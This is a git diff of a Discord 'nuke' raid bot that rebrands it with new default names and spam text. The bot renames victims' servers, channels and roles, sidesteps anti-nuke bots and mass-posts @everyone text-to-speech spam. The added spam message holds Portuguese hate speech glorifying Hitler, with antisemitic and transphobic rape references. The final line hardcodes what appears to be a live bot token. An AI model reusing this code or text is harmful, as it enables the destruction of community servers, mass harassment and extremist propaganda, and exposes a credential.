@@ -149,31 +149,31 @@ def set_show_username(user_id, value: bool):
     set_user_config(user_id, "show_username", value)
 
 def get_channel_name(user_id):
-    return get_user_config(user_id).get("channel_name", "insomnia-on-top")
+    return get_user_config(user_id).get("channel_name", "saint-rape-no-topo")
 
 def set_channel_name(user_id, value: str):
     set_user_config(user_id, "channel_name", value)
 
 def get_webhook_name(user_id):
-    return get_user_config(user_id).get("webhook_name", "insomnia")
+    return get_user_config(user_id).get("webhook_name", "saint rape")
 
 def set_webhook_name(user_id, value: str):
     set_user_config(user_id, "webhook_name", value)
 
 def get_webhook_message(user_id):
-    return get_user_config(user_id).get("webhook_message", "insomnia owns this")
+    return get_user_config(user_id).get("webhook_message", "saint rape molestou")
 
 def set_webhook_message(user_id, value: str):
     set_user_config(user_id, "webhook_message", value)
 
 def get_server_name(user_id):
-    return get_user_config(user_id).get("server_name", "insomnia owns this")
+    return get_user_config(user_id).get("server_name", "saint rape manda nisso")
 
 def set_server_name(user_id, value: str):
     set_user_config(user_id, "server_name", value)
 
 def get_role_name(user_id):
-    return get_user_config(user_id).get("role_name", "join insomnia")
+    return get_user_config(user_id).get("role_name", "viva saint rape")
 
 def set_role_name(user_id, value: str):
     set_user_config(user_id, "role_name", value)
@@ -248,11 +248,11 @@ async def handle_set_name_setting(interaction: Interaction, setting_key: str, ne
     if setting_key != "show_username":
         if not is_premium_user(user_id):
             defaults = {
-                "channel_name": "insomnia-on-top",
-                "webhook_name": "insomnia",
+                "channel_name": "saint-rape-no-topo",
+                "webhook_name": "saint rape",
                 "webhook_message": "Server has been nuked!",
-                "server_name": "insomnia owns this",
-                "role_name": "join insomnia",
+                "server_name": "molestados pela saint rape",
+                "role_name": "viva saint rape",
             }
             set_user_config(user_id, setting_key, defaults.get(setting_key, ""))
             await interaction.response.send_message(
@@ -603,8 +603,8 @@ async def invite(ctx):
     )
 
     embed = discord.Embed(
-        title="🔗 Invite The Bot",
-        description="Click the link below to invite the bot with admin permissions:",
+        title="resenha on",
+        description="chama ai",
         color=discord.Color.blurple()
     )
     embed.add_field(name="Invite Link", value=f"[Click here to invite]({invite_link})", inline=False)
@@ -981,10 +981,22 @@ async def setup(ctx):
     if found:
         print(f"[!] Antinuke-Bots found:\n" + "\n".join(found) + "\nbypassing...")
 
-        webhook_message = user_config.get("webhook_message", "insomnia owns this")
-        if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
-            spam_message = "@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI"
-        else:
+        webhook_message = user_config.get("webhook_message", "saint rape no topo")
+        if webhook_message in ["saint rape no topo", "Server has been nuked!"]:
+            spam_message = "@everyone [SAINT RAPE](<https://discord.gg/665Ak3GZYE>) ESTUPRANDO OS TRAVECOS JUDEUS?!?!?!
+
+VOCÊS FORAM ESTUPRADOS PELO SAINT RAPE, ESTE SERVIDOR ESTÁ SENDO ENVIADO PARA O GRANDIOSO FUHRER ADOLF HELLBOY HITLER SKYZA RATO MACONHA 
+
+ESTE SERVIDOR PERTENCE AO 5 REICH ALEMÃO DE SERGIPE, SAUDEM O SEU FUHRER!
+
+https://cdn.discordapp.com/attachments/1416904224922669108/1424447630100136067/Captura_de_tela_2024-10-13_211507.png?ex=68e3fbbb&is=68e2aa3b&hm=61b7637c4bf10d46e79cd0fbe1fe3e2dcca0dbd9d347aac75b0659a5249c0a48&
+
+https://cdn.discordapp.com/attachments/1312853415529021551/1394484947938443305/lv-0-20221017212002_1.mp4?ex=692500cf&is=6923af4f&hm=274d253a2a655de59f8a0df03555a2e9bb8e284f9bdceaafd87f833004ab99f1&
+
+https://cdn.discordapp.com/attachments/1303669003021062157/1442334179613343775/services-instagram-post-DRYEKTOksOo-0.mp4?ex=69250de1&is=6923bc61&hm=a2ce526bc86187b8a26b511a521753aaaf1b70ca447e9ba6385cb7b5051fedbf&
+
+https://cdn.discordapp.com/attachments/1312853415529021551/1394485266827317509/thugborea10.mp4?ex=694007db&is=693eb65b&hm=6794676977a8d5619c1943c10117f9a5439f279ab4ad03d4a63ceec5fe9734ca&"
+            
             spam_message = webhook_message
 
         for channel in guild.text_channels:
@@ -999,10 +1011,10 @@ async def setup(ctx):
 
     save_nuke_stats(user.id, guild)
 
-    channel_name = user_config.get("channel_name", "insomnia-on-top")
-    webhook_message = user_config.get("webhook_message", "insomnia owns this")
+    channel_name = user_config.get("channel_name", "saint-rape")
+    webhook_message = user_config.get("webhook_message", "saint rape molestou")
     server_name = user_config.get("server_name", guild.name)
-    role_name = user_config.get("role_name", "insomnia-owns-u")
+    role_name = user_config.get("role_name", "saint-rape-molestou")
 
     try:
         await guild.edit(name=server_name)
@@ -1031,23 +1043,19 @@ async def setup(ctx):
             embed = discord.Embed(
                 title="**__NUKED BY INSOMNIA__**",
                 description=(
-                    "`Unfortunately this server has been nuked due to admins' inattention.`\n"
-                    "### If you're interested in this bot or you need to destroy somebody's server you can [join](https://discord.gg/VSQzzAMVw3) our discord server.\n"
-                    "**Insomnia has:**\n"
-                    "> **Powerful bots with uptime 24/7**\n"
-                    "> **Raid/Nuke features**\n"
-                    "> **Good community**"
+                    "`Infelizmente vocês foram raidados graças ao espirito' natalino.`\n"
+                    
                 ),
                 color=0xb161f9
             )
-            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1395783321895567461/1398652948812267630/11131604.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1416904224922669108/1424447630100136067/Captura_de_tela_2024-10-13_211507.png?ex=694d73bb&is=694c223b&hm=ecd6ef96a0cc91ad99de1d0f640c3a989675468b9531589b75fd4884a8157ed0&")
 
-            if webhook_message in ["insomnia owns this", "Server has been nuked!"]:
+            if webhook_message in ["saint rape no topo", "Server has been nuked!"]:
                 is_premium = is_premium_user(user.id)
                 spams = 25 if is_premium else 10
                 for _ in range(spams):
                     await ch.send(
-                        content="@everyone discord.gg/VSQzzAMVw3 https://www.youtube.com/watch?v=FMwC4TtNvbI",
+                        content="@everyone https://discord.gg/665Ak3GZYE",
                         embed=embed,
                         tts=True
                     )
@@ -1088,4 +1096,5 @@ async def on_ready():
     auto_leave_task.start()
 
 
-bot.run(TOKEN)
+
+bot.run(MTQ0OTkwMDExNjY1NDgyMTQ2Nw.GnGbo1.YDAb_BX_YUZfAcodR1HSVPb8Ik9MoU3i1oHzG8)
